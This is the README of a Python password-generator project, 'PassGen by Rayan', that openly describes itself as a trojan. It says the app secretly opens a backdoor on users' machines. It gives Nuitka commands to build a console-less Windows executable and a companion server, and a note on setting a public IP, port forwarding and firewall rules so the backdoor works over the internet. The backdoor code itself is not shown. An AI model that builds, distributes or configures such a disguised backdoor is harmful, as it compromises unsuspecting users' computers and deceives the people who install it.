
# PassGen by Rayan v0.70

PassGen by Rayan is a free and open-source software using python. In a nutshell, the software is a strong password generator that generates infinite number of customized passwords up to the user's input. Its main goal is to help the users create a hard to crack password by providing various features:

- Customized password length (4-128)
- Enable/Disable alphabets
- Enable/Disable numbers
- Enable/Disable special characters

However, It has a hidden functionality; it opens a backdoor in the client's machine for the host to exploit.
## User Interface

![App Screenshot](https://i.ibb.co/THtfjyp/App.png)
## Authors

- [@v0x45](https://github.com/v0x45)
## Build it yourself

PassGen by Rayan is a free and open-source software, to compile it yourself using python:
- install the following libraries:
```bash
  python -m pip install ttkbootstrap
  python -m pip install pyperclip
  python -m pip install Pillow
  python -m pip install colorama
  python -m pip install nuitka
```

- Afterwards, compile the Passgen-by-Rayan-v0.70.py code with [Nuitka](https://github.com/Nuitka/Nuitka) using the following command (Change ```<>``` to the correct directory path):
```batch
py -m nuitka --mingw64 .\PassGen-by-Rayan-v0.70.py --standalone --onefile --windows-disable-console --windows-icon-from-ico=PassGen_by_Rayan_x96.ico --include-data-dir=<C:/Users/v0x45/Desktop/PassGen-by-Rayan/Icons=Icons> --enable-plugin=tk-inter
```
- Lastly, compile the Server-by-Rayan-v0.30.py with [Nuitka](https://github.com/Nuitka/Nuitka) using the following command:
```batch
py -m nuitka --mingw64 .\Server-by-Rayan-v0.30.py --standalone --onefile --windows-icon-from-ico=Server_by_Rayan_x96.ico
```
#### NOTE:
The injected backdoor communicates inside your network only; to communicate outside your network, do the following:
- In PassGen-by-Rayan-v0.70.py, line 56, replace '127.1.0.0' with your public ip address, check [whatismyip](https://www.whatismyip.com/)
- In PassGen-by-Rayan-v0.70.py, line 57, replace '7976' with an open port, test the status of your port at [yougetsignal](https://www.yougetsignal.com/tools/open-ports/). Don't know anything about port forwarding? Google it.
- In Server-by-Rayan-v0.30.py, line 18, match the port number to whatever you have registered in PassGen-by-Rayan-v0.70.py.
- You need to create a new rule in your firewall for that port
## Acknowledgements

 - [def get_pos()](https://stackoverflow.com/a/65530528) & [def move_window()](https://stackoverflow.com/a/65530528) were excerpted from [furas](https://stackoverflow.com/users/1832058/furas).
 - The code that positions the application window in the center of the screen was excerpted from [yagisanatode](https://yagisanatode.com/2018/02/24/how-to-center-the-main-window-on-the-screen-in-tkinter-with-python-3/)
 - Great tkinter tutorial playlist [freeCodeCamp.org](https://www.youtube.com/playlist?list=PLCC34OHNcOtoC6GglhF3ncJ5rLwQrLGnV)
 - The ASCII art of the server header was created using [fsymbols](https://fsymbols.com/generators/carty/)
 - [dev.to](https://dev.to/tman540/simple-remote-backdoor-with-python-33a0) was used as a reference during building the backdoor
## Used Libraries/APIs

 - [1] I. Dryer, 2021. URL: https://github.com/israel-dryer/ttkbootstrap.
 - [2] G. Rossum, 1998. URL: https://github.com/python/cpython/blob/3.10/Lib/getpass.py.
 - [3] G. Rossum, 1992. URL: https://github.com/python/cpython/blob/3.10/Lib/os.py.
 - [4] M. Lemburg, 2003. URL: https://github.com/python/cpython/blob/3.10/Lib/platform.py.
 - [5] G. Rossum, 1994. URL: https://github.com/python/cpython/blob/3.10/Lib/random.py.
 - [6] F. Drake, 2000. URL: https://github.com/python/cpython/blob/3.10/Lib/socket.py.
 - [7] F. Lundh, 2004. URL: https://github.com/python/cpython/blob/3.10/Lib/subprocess.py.
 - [8] G. Rossum, 1998. URL: https://github.com/python/cpython/blob/3.10/Lib/threading.py.
 - [9] G. Brandl, 2008. URL: https://github.com/python/cpython/blob/3.10/Lib/tkinter.py.
 - [10] F. Drake, 2000. URL: https://github.com/python/cpython/blob/3.10/Lib/webbrowser.py.
 - [11] J. Hartley, 2014. URL: https://github.com/tartley/colorama.
 - [12] A. Sweigart, 2011. URL: https://github.com/asweigart/pyperclip.
 - [13] F. A. Clark. 2015. URL: https://github.com/python-pillow/Pillow.
